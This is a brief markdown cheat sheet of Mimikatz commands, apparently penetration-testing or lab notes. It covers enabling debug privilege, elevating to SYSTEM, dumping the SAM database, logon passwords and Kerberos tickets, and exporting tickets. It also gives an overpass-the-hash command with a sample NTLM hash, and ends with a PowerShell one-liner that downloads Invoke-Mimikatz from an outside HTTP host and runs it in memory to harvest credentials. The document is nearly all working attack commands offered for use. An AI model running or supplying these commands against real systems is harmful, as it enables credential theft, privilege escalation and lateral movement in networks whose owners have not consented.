### enables the _SeDebugPrivilge_ access right required to tamper with another process

```powershell
privilege::debug
```

### elevate the security token from high integrity (administrator) to SYSTEM integrity
```powershell
token::elevate
```

### dump the contents of the SAM database
```powershell
lsadump::sam
```

### Dump logged-on users password

```powershell
sekurlsa::logonpasswords
```

### Dump Tickets

```powershell
sekurlsa::tickets
```

### List & Export tickets
```powershell
kerberos::list
kerberos::list /export
sekurlsa::tickets
sekurlsa::tickets /export
```

### OverPass The Hash 
Get a ticket using NTLM hash

```powershell
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```


### LOAD IN MEM

```powershell
powershell.exe -exec Bypass -C 'IEX (IWR http://10.2.2.218:8080/Invoke-Mimikatz.ps1 -UsebasicParsing);Invoke-Mimikatz -Command \" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::tickets" "exit" \" '
```

